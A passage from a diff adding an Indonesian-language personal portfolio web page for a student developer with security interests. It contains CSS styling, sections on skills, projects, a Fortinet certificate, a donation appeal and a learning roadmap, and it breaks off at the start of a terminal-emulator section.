+            border: 1px solid var(--border-color);
+            transition: all 0.3s;
+        }
+
+        .certificate-card:hover {
+            transform: translateY(-6px);
+            box-shadow: 0 12px 40px rgba(0, 255, 65, 0.08);
+        }
+
+        .certificate-card .cert-border {
+            border: 2px solid var(--border-color);
+            border-radius: 10px;
+            padding: 24px;
+            background: var(--bg-secondary);
+        }
+
+        .cert-header {
+            text-align: center;
+            margin-bottom: 16px;
+            border-bottom: 2px solid var(--border-color);
+            padding-bottom: 12px;
+        }
+
+        .cert-header .cert-logo {
+            max-height: 45px;
+            margin-bottom: 6px;
+            filter: brightness(0.8);
+        }
+
+        .cert-header h1 {
+            font-family: var(--font-display);
+            font-size: 1.3rem;
+            color: var(--text-primary);
+        }
+
+        .cert-header h2 {
+            font-family: var(--font-regular);
+            font-size: 0.9rem;
+            color: var(--accent);
+            font-weight: 600;
+            letter-spacing: 2px;
+        }
+
+        .cert-body {
+            text-align: center;
+            padding: 8px 0;
+        }
+
+        .cert-body p {
+            color: var(--text-secondary);
+            font-size: 0.85rem;
+        }
+
+        .cert-body h3 {
+            font-family: var(--font-display);
+            font-size: 1.6rem;
+            color: var(--accent);
+            margin: 4px 0 10px;
+            text-shadow: 0 0 20px var(--accent-glow);
+        }
+
+        .cert-body strong {
+            color: var(--text-primary);
+        }
+
+        .cert-meta {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            flex-wrap: wrap;
+            font-size: 0.7rem;
+            color: var(--text-secondary);
+            margin: 10px 0;
+        }
+
+        .cert-meta i {
+            color: var(--accent);
+            margin-right: 4px;
+        }
+
+        .cert-quote {
+            font-style: italic;
+            color: var(--text-secondary);
+            font-size: 0.85rem;
+            border-top: 1px solid var(--border-color);
+            padding-top: 10px;
+            margin-top: 6px;
+            opacity: 0.8;
+        }
+
+        .cert-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            margin-top: 16px;
+            border-top: 2px solid var(--border-color);
+            padding-top: 12px;
+        }
+
+        .cert-footer .signature span {
+            display: block;
+            font-family: var(--font);
+            font-size: 0.9rem;
+            color: var(--text-primary);
+            font-weight: 600;
+        }
+
+        .cert-footer .signature small {
+            color: var(--text-secondary);
+            font-size: 0.65rem;
+        }
+
+        .cert-footer .stamp i {
+            font-size: 1.6rem;
+            color: var(--accent);
+            display: block;
+        }
+
+        .cert-footer .stamp span {
+            font-size: 0.55rem;
+            color: var(--accent);
+            font-weight: 700;
+            letter-spacing: 2px;
+            display: block;
+        }
+
+        .nasa-cert .cert-border { border-color: #0b3d91; }
+        .bank-australia-cert .cert-border { border-color: #004b87; }
+        .bank-japan-cert .cert-border { border-color: #c41e3a; }
+        .studio-japan-cert .cert-border { border-color: #1a1a1a; }
+
+        /* Tools */
+        .tools-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 14px;
+            margin-bottom: 30px;
+        }
+
+        .tool-item {
+            background: var(--bg-card);
+            padding: 14px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            text-align: center;
+            transition: all 0.3s;
+        }
+
+        .tool-item:hover {
+            border-color: var(--accent);
+            transform: translateY(-4px);
+        }
+
+        .tool-item i {
+            font-size: 1.8rem;
+            color: var(--accent);
+            margin-bottom: 6px;
+            display: block;
+        }
+
+        .tool-item h4 {
+            font-family: var(--font);
+            font-size: 0.85rem;
+            color: var(--text-primary);
+        }
+
+        .tool-item p {
+            font-size: 0.7rem;
+            color: var(--text-secondary);
+        }
+
+        /* Bug Cards */
+        .bug-card {
+            background: var(--bg-card);
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            padding: 24px;
+            margin-bottom: 24px;
+            transition: all 0.3s;
+        }
+
+        .bug-card:hover {
+            border-color: var(--accent);
+            box-shadow: 0 8px 30px rgba(0, 255, 65, 0.05);
+        }
+
+        .bug-card .bug-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+
+        .bug-card .bug-title {
+            font-family: var(--font-display);
+            font-size: 1.1rem;
+            color: var(--accent);
+        }
+
+        .bug-card .bug-severity {
+            font-family: var(--font);
+            font-size: 0.75rem;
+            padding: 4px 14px;
+            border-radius: 20px;
+            font-weight: 600;
+        }
+
+        .severity-critical { background: #ff0000; color: #fff; }
+        .severity-high { background: #ff6600; color: #fff; }
+        .severity-medium { background: #ffcc00; color: #000; }
+        .severity-low { background: #00cc66; color: #000; }
+
+        .bug-card .bug-desc {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            margin-bottom: 12px;
+        }
+
+        .bug-card .bug-desc code {
+            background: var(--bg-primary);
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-family: var(--font);
+            font-size: 0.8rem;
+            color: var(--accent);
+        }
+
+        .bug-card .bug-code {
+            background: var(--bg-primary);
+            padding: 14px;
+            border-radius: 6px;
+            font-family: var(--font);
+            font-size: 0.75rem;
+            color: var(--text-primary);
+            overflow-x: auto;
+            border: 1px solid var(--border-color);
+            margin: 10px 0;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .bug-card .bug-meta {
+            display: flex;
+            gap: 16px;
+            flex-wrap: wrap;
+            font-size: 0.7rem;
+            color: var(--text-secondary);
+            margin-top: 8px;
+        }
+
+        .bug-card .bug-meta i {
+            color: var(--accent);
+            margin-right: 4px;
+        }
+
+        /* Apresiasi */
+        .appreciation-box {
+            background: var(--bg-card);
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            padding: 30px;
+            text-align: center;
+            margin-top: 30px;
+            transition: all 0.3s;
+        }
+
+        .appreciation-box:hover {
+            border-color: var(--accent);
+        }
+
+        .appreciation-box h3 {
+            font-family: var(--font-display);
+            font-size: 1.3rem;
+            color: var(--accent);
+            margin-bottom: 12px;
+        }
+
+        .appreciation-box p {
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+            line-height: 1.8;
+        }
+
+        /* ============================================================
+           CONTACT
+           ============================================================ */
+        .contact {
+            background: var(--bg-secondary);
+            transition: background 0.3s;
+        }
+
+        .contact-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 40px;
+        }
+
+        .contact-info {
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+        }
+
+        .contact-item {
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            background: var(--bg-card);
+            padding: 20px 24px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            transition: all .3s;
+        }
+
+        .contact-item:hover {
+            border-color: var(--accent);
+        }
+
+        .contact-item i {
+            font-size: 1.4rem;
+            color: var(--accent);
+            width: 44px;
+            height: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: var(--accent-glow);
+            border-radius: 8px;
+        }
+
+        .contact-item h4 {
+            font-size: .9rem;
+            margin-bottom: 2px;
+        }
+
+        .contact-item p {
+            color: var(--text-secondary);
+            font-size: .9rem;
+        }
+
+        .contact-form {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .contact-form input,
+        .contact-form textarea {
+            padding: 14px 18px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            background: var(--bg-card);
+            color: var(--text-primary);
+            font-size: .95rem;
+            transition: border .3s;
+            font-family: var(--font);
+        }
+
+        .contact-form input:focus,
+        .contact-form textarea:focus {
+            outline: none;
+            border-color: var(--accent);
+        }
+
+        .contact-form textarea {
+            resize: vertical;
+        }
+
+        .contact-form .btn {
+            justify-content: center;
+            padding: 14px;
+            font-size: 1rem;
+        }
+
+        /* ============================================================
+           TANDA TANGAN
+           ============================================================ */
+        .ttd-section {
+            background: var(--bg-secondary);
+            transition: background 0.3s;
+            padding: 40px 0 60px;
+        }
+
+        .ttd-box {
+            text-align: center;
+            padding: 30px;
+            border-top: 1px solid var(--border-color);
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .nama-ttd {
+            font-size: 1.6rem;
+            font-family: var(--font-display);
+            color: var(--accent);
+            font-weight: 700;
+        }
+
+        .ttd-device {
+            display: inline-block;
+            margin-top: 12px;
+            background: var(--bg-card);
+            padding: 6px 18px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+            font-family: var(--font);
+            border: 1px solid var(--border-color);
+        }
+
+        .ttd-device i {
+            color: var(--accent);
+            margin-right: 8px;
+        }
+
+        /* ============================================================
+           TOAST NOTIFICATION
+           ============================================================ */
+        .toast-container {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            z-index: 9998;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .toast {
+            background: var(--toast-bg);
+            border: 1px solid var(--toast-border);
+            color: var(--toast-text);
+            padding: 14px 24px;
+            border-radius: 8px;
+            font-family: var(--font);
+            font-size: 0.9rem;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
+            animation: slideIn 0.4s ease-out forwards;
+            min-width: 250px;
+            max-width: 400px;
+        }
+
+        .toast.success { border-color: #00ff41; }
+        .toast.error { border-color: #ff4444; }
+        .toast.info { border-color: #4488ff; }
+
+        @keyframes slideIn {
+            0% { opacity: 0; transform: translateX(100px); }
+            100% { opacity: 1; transform: translateX(0); }
+        }
+
+        .toast.hide {
+            animation: slideOut 0.3s ease-in forwards;
+        }
+
+        @keyframes slideOut {
+            0% { opacity: 1; transform: translateX(0); }
+            100% { opacity: 0; transform: translateX(100px); }
+        }
+
+        /* ============================================================
+           VISITOR COUNTER
+           ============================================================ */
+        .visitor-counter {
+            text-align: center;
+            padding: 10px 0;
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+            opacity: 0.6;
+            border-top: 1px solid var(--border-color);
+            margin-top: 20px;
+        }
+
+        .visitor-counter span {
+            color: var(--accent);
+            font-weight: 700;
+        }
+
+        /* ============================================================
+           FOOTER
+           ============================================================ */
+        footer {
+            border-top: 1px solid var(--border-color);
+            padding: 30px 0;
+            text-align: center;
+            background: var(--bg-primary);
+            transition: background 0.3s;
+        }
+
+        footer p {
+            color: var(--text-secondary);
+            font-size: .9rem;
+        }
+
+        .footer-quote {
+            margin-top: 6px;
+            font-style: italic;
+            opacity: .6;
+            font-size: .85rem;
+        }
+
+        /* ============================================================
+           RESPONSIVE
+           ============================================================ */
+        @media (max-width: 1024px) {
+            .hero-content { flex-direction: column; text-align: center; }
+            .hero-text h1 { font-size: 2.8rem; }
+            .subtitle { margin: 0 auto 30px; }
+            .hero-buttons { justify-content: center; }
+            .social-links { justify-content: center; }
+            .glitch-border { width: 260px; height: 260px; }
+            .contact-grid { grid-template-columns: 1fr; }
+            .badge-3 { right: -10px; top: 80%; }
+        }
+
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+                flex-direction: column;
+                background: var(--bg-primary);
+                padding: 20px;
+                border-radius: 8px;
+                border: 1px solid var(--border-color);
+                position: absolute;
+                top: 70px;
+                right: 20px;
+                width: 200px;
+            }
+            .nav-links.active { display: flex; }
+            .hamburger { display: flex; }
+            .hero-text h1 { font-size: 2.2rem; }
+            .glitch-border { width: 200px; height: 200px; }
+            .floating-badge { font-size: .65rem; padding: 6px 12px; }
+            .badge-1 { top: -10px; right: -10px; }
+            .badge-2 { bottom: -10px; left: -10px; }
+            .badge-3 { right: -10px; top: 70%; }
+            .section-header h2 { font-size: 1.8rem; }
+            .about-grid, .skills-grid, .project-grid, .cert-grid { grid-template-columns: 1fr; }
+            .terminal-box { padding: 12px; }
+            .terminal-input-row { flex-wrap: wrap; }
+            .term-status { flex-direction: column; gap: 4px; align-items: flex-start; }
+            .kisah-grid { grid-template-columns: 1fr; }
+            .panduan-grid { grid-template-columns: 1fr; }
+            .donasi-box { padding: 24px 16px; }
+            .donasi-list { text-align: center; }
+            .btn-donasi { width: 100%; justify-content: center; }
+            .panduan-tips { flex-direction: column; text-align: center; }
+            .ttd-box { padding: 20px 0; }
+            .nama-ttd { font-size: 1.3rem; }
+            .contact-grid { grid-template-columns: 1fr; }
+            .tools-grid { grid-template-columns: repeat(2, 1fr); }
+            .bug-card .bug-header { flex-direction: column; align-items: flex-start; }
+            .certificate-card { padding: 12px; }
+            .certificate-card .cert-border { padding: 16px; }
+            .cert-body h3 { font-size: 1.3rem; }
+            .cert-footer { flex-direction: column; align-items: center; gap: 12px; text-align: center; }
+        }
+
+        @media (max-width: 480px) {
+            .hero-text h1 { font-size: 1.8rem; }
+            .btn { padding: 10px 20px; font-size: .85rem; }
+            .glitch-border { width: 160px; height: 160px; }
+            .floating-badge { font-size: .55rem; padding: 4px 10px; }
+            .badge-3 { display: none; }
+            .hacker-tag { bottom: -25px; font-size: .5rem; padding: 2px 10px; }
+            .section-header h2 { font-size: 1.5rem; }
+            .toast-container { left: 20px; right: 20px; bottom: 20px; }
+            .toast { width: 100%; max-width: 100%; }
+            .donasi-box h3 { font-size: 1.2rem; }
+            .panduan-tahap { font-size: 1.1rem; }
+            .qr-container img { max-width: 160px; }
+            .tools-grid { grid-template-columns: 1fr; }
+            .bug-card .bug-code { font-size: 0.65rem; padding: 10px; }
+            .cert-meta { flex-direction: column; gap: 6px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ====== MATRIX RAIN CANVAS ====== -->
+    <canvas id="matrix"></canvas>
+
+    <!-- ====== TERMINAL OVERLAY ====== -->
+    <div class="terminal-overlay" id="terminalOverlay">
+        <div class="terminal-text">
+            <span class="typing">> SYSTEM INITIALIZED... ZAID_ALVAN_LOADED</span>
+            <span class="typing" style="animation-delay:1.5s;">> FORTINET_CERTIFIED_FUNDAMENTALS_ACTIVE</span>
+            <span class="typing" style="animation-delay:3s;">> WELCOME_TO_THE_MATRIX</span>
+        </div>
+    </div>
+
+    <!-- ====== TOAST CONTAINER ====== -->
+    <div class="toast-container" id="toastContainer"></div>
+
+    <!-- ====== NAVBAR ====== -->
+    <nav class="navbar">
+        <div class="container">
+            <div class="logo">
+                <span class="logo-icon">#</span>
+                <span class="logo-text">Zaid<span class="highlight">Alvan</span></span>
+            </div>
+            <ul class="nav-links">
+                <li><a href="#home">Beranda</a></li>
+                <li><a href="#about">Tentang</a></li>
+                <li><a href="#skills">Keahlian</a></li>
+                <li><a href="#projects">Proyek</a></li>
+                <li><a href="#certificates">Sertifikat</a></li>
+                <li><a href="#kisah">Kisah</a></li>
+                <li><a href="#panduan">Panduan</a></li>
+                <li><a href="#terminal">Terminal</a></li>
+                <li><a href="#bug-bounty">Bug Bounty</a></li>
+                <li><a href="#contact">Kontak</a></li>
+                <li><button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">🌓</button></li>
+            </ul>
+            <div class="hamburger" id="hamburger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+    </nav>
+
+    <!-- ====== HERO ====== -->
+    <section id="home" class="hero">
+        <div class="container hero-content">
+            <div class="hero-text">
+                <div class="badge"><span class="glitch-text">[root@zaid-alvan ~]#</span></div>
+                <h1><span class="line-1">Zaid</span><span class="line-2 highlight">Alvan</span></h1>
+                <p class="subtitle">
+                    <span class="cmd-prompt">$</span>
+                    <span class="cmd-text">whoami</span>
+                    <span class="cmd-result">→ Santri | Developer | Fortinet Certified Fundamentals</span>
+                </p>
+                <div class="hero-buttons">
+                    <a href="#projects" class="btn btn-primary"><i class="fas fa-terminal"></i> $ ls -la proyek</a>
+                    <a href="#contact" class="btn btn-outline"><i class="fas fa-envelope"></i> $ echo "Hubungi Saya"</a>
+                </div>
+                <div class="social-links">
+                    <a href="#" aria-label="GitHub"><i class="fab fa-github"></i></a>
+                    <a href="#" aria-label="LinkedIn"><i class="fab fa-linkedin"></i></a>
+                    <a href="#" aria-label="Instagram"><i class="fab fa-instagram"></i></a>
+                    <a href="#" aria-label="YouTube"><i class="fab fa-youtube"></i></a>
+                </div>
+            </div>
+            <div class="hero-image">
+                <div class="profile-frame">
+                    <div class="glitch-border">
+                        <div class="glitch-overlay"></div>
+                        <img src="assets/alvan.png" alt="Zaid Alvan" class="profile-photo" onerror="this.src='https://ui-avatars.com/api/?name=Zaid+Alvan&background=00ff41&color=000&size=200'">
+                    </div>
+                    <div class="floating-badge badge-1"><i class="fas fa-shield-halved"></i> Cyber Security</div>
+                    <div class="floating-badge badge-2"><i class="fas fa-code"></i> Developer</div>
+                    <div class="floating-badge badge-3"><i class="fas fa-certificate"></i> Fortinet Certified</div>
+                    <div class="hacker-tag"><span>// ROOT ACCESS</span></div>
+                </div>
+            </div>
+        </div>
+        <div class="hero-bg-pattern"></div>
+    </section>
+
+    <!-- ====== ABOUT ====== -->
+    <section id="about" class="about">
+        <div class="container">
+            <div class="section-header">
+                <span class="section-tag">> about_zaid</span>
+                <h2>Kenali <span class="highlight">Zaid Alvan</span></h2>
+                <p class="section-desc">Perjalanan saya di dunia cybersecurity, development, dan sertifikasi Fortinet</p>
+            </div>
+            <div class="about-grid">
+                <div class="about-card hacker-card">
+                    <div class="about-icon"><i class="fas fa-graduation-cap"></i></div>
+                    <h3>Pendidikan</h3>
+                    <p>Pondok Pesantren Salafiyah<br><span class="small">Santri & Developer</span></p>
+                </div>
+                <div class="about-card hacker-card">
+                    <div class="about-icon"><i class="fas fa-shield-halved"></i></div>
+                    <h3>Keahlian</h3>
+                    <p>Cyber Security, Network Security, Ethical Hacking, Bug Bounty</p>
+                </div>
+                <div class="about-card hacker-card">
+                    <div class="about-icon"><i class="fas fa-laptop-code"></i></div>
+                    <h3>Developer</h3>
+                    <p>Full-Stack Developer, Android Dev, Web Dev, IoT Enthusiast</p>
+                </div>
+                <div class="about-card hacker-card fortinet-about">
+                    <div class="about-icon"><i class="fas fa-certificate"></i></div>
+                    <h3>Fortinet Certified</h3>
+                    <p>Fortinet Certified Fundamentals in Cybersecurity - 2026</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ====== SKILLS ====== -->
+    <section id="skills" class="skills">
+        <div class="container">
+            <div class="section-header">
+                <span class="section-tag">> skills --list</span>
+                <h2>Yang Saya <span class="highlight">Kuasai</span></h2>
+            </div>
+            <div class="skills-grid">
+                <div class="skill-category hacker-card">
+                    <h3><i class="fas fa-shield-halved"></i> Cyber Security</h3>
+                    <div class="skill-bar"><span style="width:90%">Security Analysis</span></div>
+                    <div class="skill-bar"><span style="width:85%">Network Security</span></div>
+                    <div class="skill-bar"><span style="width:75%">Bug Bounty</span></div>
+                    <div class="skill-bar"><span style="width:80%">Ethical Hacking</span></div>
+                </div>
+                <div class="skill-category hacker-card">
+                    <h3><i class="fas fa-code"></i> Development</h3>
+                    <div class="skill-bar"><span style="width:85%">HTML/CSS/JS</span></div>
+                    <div class="skill-bar"><span style="width:80%">Python</span></div>
+                    <div class="skill-bar"><span style="width:70%">Java / Kotlin</span></div>
+                    <div class="skill-bar"><span style="width:65%">PHP / MySQL</span></div>
+                </div>
+                <div class="skill-category hacker-card">
+                    <h3><i class="fas fa-tools"></i> Tools</h3>
+                    <div class="skill-bar"><span style="width:80%">Kali Linux</span></div>
+                    <div class="skill-bar"><span style="width:75%">Burp Suite</span></div>
+                    <div class="skill-bar"><span style="width:70%">Metasploit</span></div>
+                    <div class="skill-bar"><span style="width:75%">Nmap / Wireshark</span></div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ====== PROJECTS ====== -->
+    <section id="projects" class="projects">
+        <div class="container">
+            <div class="section-header">
+                <span class="section-tag">> projects --deploy</span>
+                <h2>Karya <span class="highlight">Terbaru</span></h2>
+            </div>
+            <div class="project-grid">
+                <div class="project-card hacker-card">
+                    <div class="project-icon"><i class="fas fa-shield-virus"></i></div>
+                    <h3>VANIME RAT</h3>
+                    <p>Android Remote Administration Tool untuk security testing dan monitoring</p>
+                    <span class="project-tag">Android Security</span>
+                </div>
+                <div class="project-card hacker-card">
+                    <div class="project-icon"><i class="fas fa-bug"></i></div>
+                    <h3>Bug Bounty Tools</h3>
+                    <p>Koleksi tools otomatisasi untuk bug hunting dan vulnerability assessment</p>
+                    <span class="project-tag">Cyber Security</span>
+                </div>
+                <div class="project-card hacker-card">
+                    <div class="project-icon"><i class="fas fa-database"></i></div>
+                    <h3>Pondok App</h3>
+                    <p>Aplikasi manajemen santri dan pembelajaran berbasis web & mobile</p>
+                    <span class="project-tag">Web/Android</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ====== CERTIFICATES ====== -->
+    <section id="certificates" class="certificates">
+        <div class="container">
+            <div class="section-header">
+                <span class="section-tag">> certificates --show</span>
+                <h2>Sertifikat <span class="highlight">Fortinet</span></h2>
+                <p class="section-desc">Fortinet Certified Fundamentals in Cybersecurity - 2026</p>
+            </div>
+            <div class="cert-grid">
+                <div class="cert-card">
+                    <div class="cert-image-wrapper">
+                        <img src="assets/sertifikat.jpg" alt="Sertifikat Fortinet" onerror="this.src='https://via.placeholder.com/600x400/0a0a0a/00ff41?text=FORTINET+CERTIFIED+FUNDAMENTALS'">
+                    </div>
+                    <div class="cert-body">
+                        <div class="cert-header">
+                            <span class="cert-org">FORTINET ⭐</span>
+                            <span class="cert-year">2026</span>
+                        </div>
+                        <h3>Fortinet Certified Fundamentals in Cybersecurity</h3>
+                        <p>Diberikan kepada <strong>Zaid Alvan</strong> atas penyelesaian program <strong>Fortinet Certified Fundamentals</strong> dengan predikat <span class="highlight">Sangat Memuaskan</span>.</p>
+                        <div class="cert-meta">
+                            <span><i class="fas fa-id-card"></i> ID: 0729865951FR</span>
+                            <span><i class="fas fa-award"></i> Grade: A</span>
+                        </div>
+                        <div class="cert-seal">
+                            <i class="fas fa-certificate"></i>
+                            <span>VERIFIED BY FORTINET</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ====== KISAH PERJALANAN ====== -->
+    <section id="kisah" class="kisah">
+        <div class="container">
+            <div class="section-header">
+                <span class="section-tag">> about_zaid --story</span>
+                <h2>Kisah Perjalanan <span class="highlight">Zaid Alvan</span></h2>
+                <p class="section-desc">Dari Pondok Pesantren Salafiyah Menuju Dunia Teknologi</p>
+            </div>
+            <div class="kisah-grid">
+                <div class="kisah-card hacker-card">
+                    <div class="kisah-icon"><i class="fas fa-mobile-alt"></i></div>
+                    <h3>Kondisi Saat Ini</h3>
+                    <p>Saya <strong>Zaid Alvan</strong>, santri di <span class="highlight">Pondok Pesantren Salafiyah</span>. Saya hanya bisa memegang HP <strong>1 bulan sekali</strong> dengan perangkat <span class="highlight">vivo Y12</span>.</p>
+                    <p style="margin-top:8px;font-size:0.9rem;color:var(--text-secondary);"><i class="fas fa-clock"></i> Waktu terbatas, tapi semangat tidak pernah padam.</p>
+                </div>
+                <div class="kisah-card hacker-card">
+                    <div class="kisah-icon"><i class="fas fa-graduation-cap"></i></div>
+                    <h3>Cita-Cita</h3>
+                    <p>Setelah lulus, saya ingin <span class="highlight">melanjutkan belajar ilmu teknologi perangkat lunak</span> dan menjadi <strong>Cyber Security Expert & Full-Stack Developer</strong>.</p>
+                    <p style="margin-top:8px;font-size:0.9rem;color:var(--text-secondary);"><i class="fas fa-quote-left"></i> Menggabungkan ilmu agama dan teknologi untuk manfaat umat.</p>
+                </div>
+                <div class="kisah-card hacker-card">
+                    <div class="kisah-icon"><i class="fas fa-hands-praying"></i></div>
+                    <h3>Doa & Dukungan</h3>
+                    <p>Saya sangat membutuhkan <span class="highlight">doa dan dukungan</span> dari teman-teman semua. Setiap doa dan semangat sangat berarti bagi perjalanan saya.</p>
+                    <p style="margin-top:8px;font-size:0.9rem;color:var(--text-secondary);"><i class="fas fa-heart" style="color:#ff6b6b;"></i> "Sesungguhnya Allah tidak akan mengubah keadaan suatu kaum sampai mereka mengubah keadaan diri mereka sendiri." (QS. Ar-Ra'd: 11)</p>
+                </div>
+            </div>
+
+            <!-- DONASI -->
+            <div class="donasi-box" id="donasi">
+                <h3><i class="fas fa-hand-holding-heart"></i> Dukungan & Donasi</h3>
+                <p>Saat ini saya sangat membutuhkan <span class="highlight">laptop</span> untuk belajar lebih serius. Dengan laptop, saya bisa:</p>
+                <ul class="donasi-list">
+                    <li><i class="fas fa-check-circle"></i> Belajar coding tanpa batasan waktu</li>
+                    <li><i class="fas fa-check-circle"></i> Menjalankan tools cyber security</li>
+                    <li><i class="fas fa-check-circle"></i> Membuat proyek lebih kompleks</li>
+                    <li><i class="fas fa-check-circle"></i> Mengikuti kursus online</li>
+                    <li><i class="fas fa-check-circle"></i> Mempersiapkan masa depan yang lebih cerah</li>
+                </ul>
+                <div class="qr-container">
+                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=DANA-081276149703&bgcolor=0a0a0a&color=00ff41&margin=10" alt="QRIS Dana Zaid Alvan" loading="lazy">
+                    <div class="qr-label"><i class="fas fa-qrcode"></i> Scan QRIS Dana di atas</div>
+                    <div class="no-rek"><i class="fas fa-credit-card"></i> Dana: 0812-7614-9703</div>
+                    <p style="font-size:0.8rem;opacity:0.5;margin-top:4px;">a.n Zaid Alvan</p>
+                </div>
+                <p style="font-style:italic;color:var(--text-secondary);">"Barang siapa memberi kemudahan kepada orang yang kesulitan, maka Allah akan memberi kemudahan di dunia dan akhirat." — <span class="highlight">HR. Muslim</span></p>
+                <a href="#" class="btn btn-primary btn-donasi" id="btnDonasi"><i class="fas fa-heart"></i> Donasi Sekarang</a>
+                <p style="font-size:0.8rem;opacity:0.5;margin-top:10px;">* Donasi akan digunakan untuk membeli laptop bekas yang layak pakai.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- ====== PANDUAN BELAJAR ====== -->
+    <section id="panduan" class="panduan">
+        <div class="container">
+            <div class="section-header">
+                <span class="section-tag">> panduan --learn</span>
+                <h2>Panduan Belajar <span class="highlight">Cyber Security & Developer</span></h2>
+                <p class="section-desc">Lengkap dari nol hingga mahir — untuk Zaid Alvan dan teman-teman</p>
+            </div>
+
+            <h3 class="panduan-tahap"><i class="fas fa-flag-checkered"></i> Tahap 1: Fundamental (0-3 Bulan)</h3>
+            <div class="panduan-grid">
+                <div class="panduan-item hacker-card"><span class="step">Step 1</span><h4>Dasar Komputer & Internet</h4><p>Pelajari cara kerja komputer, jaringan, internet, dan protokol HTTP/HTTPS.</p></div>
+                <div class="panduan-item hacker-card"><span class="step">Step 2</span><h4>HTML & CSS</h4><p>Buat website sederhana. Pahami struktur, styling, dan responsive design.</p></div>
+                <div class="panduan-item hacker-card"><span class="step">Step 3</span><h4>JavaScript Dasar</h4><p>Logika pemrograman, DOM, event, dan interaktivitas di website.</p></div>
+                <div class="panduan-item hacker-card"><span class="step">Step 4</span><h4>Linux & Terminal</h4><p>Belajar command line, file system, dan dasar-dasar Linux (Kali/Ubuntu).</p></div>
+            </div>
+
+            <h3 class="panduan-tahap"><i class="fas fa-shield-halved"></i> Tahap 2: Cyber Security (4-8 Bulan)</h3>
+            <div class="panduan-grid">
+                <div class="panduan-item hacker-card"><span class="step">Step 5</span><h4>Network Security</h4><p>Pelajari TCP/IP, DNS, firewall, IDS/IPS, dan Wireshark.</p></div>
+                <div class="panduan-item hacker-card"><span class="step">Step 6</span><h4>OWASP Top 10</h4><p>Pahami 10 celah keamanan paling umum (SQLi, XSS, CSRF, dll).</p></div>
+                <div class="panduan-item hacker-card"><span class="step">Step 7</span><h4>Tools Cyber Security</h4><p>Belajar Nmap, Burp Suite, Metasploit, SQLmap, dan Nikto.</p></div>
+                <div class="panduan-item hacker-card"><span class="step">Step 8</span><h4>Ethical Hacking & Bug Bounty</h4><p>Praktik di platform legal (HackTheBox, TryHackMe, Bugcrowd).</p></div>
+            </div>
+
+            <h3 class="panduan-tahap"><i class="fas fa-laptop-code"></i> Tahap 3: Developer (9-12 Bulan+)</h3>
+            <div class="panduan-grid">
+                <div class="panduan-item hacker-card"><span class="step">Step 9</span><h4>Backend & Database</h4><p>Pelajari PHP, Python, MySQL, dan API (REST/GraphQL).</p></div>
+                <div class="panduan-item hacker-card"><span class="step">Step 10</span><h4>Mobile Development</h4><p>Android (Java/Kotlin) atau Flutter untuk aplikasi mobile.</p></div>
+                <div class="panduan-item hacker-card"><span class="step">Step 11</span><h4>Version Control (Git)</h4><p>Belajar GitHub, branch, commit, dan kolaborasi tim.</p></div>
+                <div class="panduan-item hacker-card"><span class="step">Step 12</span><h4>Deploy & Hosting</h4><p>Pelajari cara deploy website di VPS, cloud, dan domain.</p></div>
+            </div>
+
+            <h3 class="panduan-tahap"><i class="fas fa-infinity"></i> Tahap 4: Mahir & Spesialisasi (12+ Bulan)</h3>
+            <div class="panduan-grid">
+                <div class="panduan-item hacker-card"><span class="step">Step 13</span><h4>Reverse Engineering & Malware</h4><p>Pelajari cara menganalisis malware dan reverse engineering.</p></div>
+                <div class="panduan-item hacker-card"><span class="step">Step 14</span><h4>Cloud Security</h4><p>Pelajari AWS, Azure, GCP, dan keamanan cloud.</p></div>
+                <div class="panduan-item hacker-card"><span class="step">Step 15</span><h4>Forensics & Incident Response</h4><p>Belajar digital forensics dan cara merespon serangan.</p></div>
+                <div class="panduan-item hacker-card"><span class="step">Step 16</span><h4>AI & Machine Learning</h4><p>Pelajari AI untuk keamanan dan pengembangan perangkat lunak.</p></div>
+            </div>
+
+            <div class="panduan-tips"><i class="fas fa-lightbulb"></i><span><span class="highlight">Tips:</span> Konsistensi lebih penting daripada kecepatan. Belajar sedikit setiap hari lebih baik daripada belajar banyak tapi putus asa.</span></div>
+        </div>
+    </section>
+
+    <!-- ====== TERMINAL EMULATOR ====== -->
+    <section id="terminal" class="terminal-emulator">
+        <div class="container">
+            <div class="section-header">
+                <span class="section-tag">> terminal --open</span>
+                <h2>Terminal <span class="highlight">Emulator</span></h2>
+                <p class="section-desc">Jalankan perintah langsung di sini — mode hacker.</p>
+            </div>
+            <div class="terminal-box hacker-card">
+                <div class="term-header">
+                    <span class="term-dot red"></span>
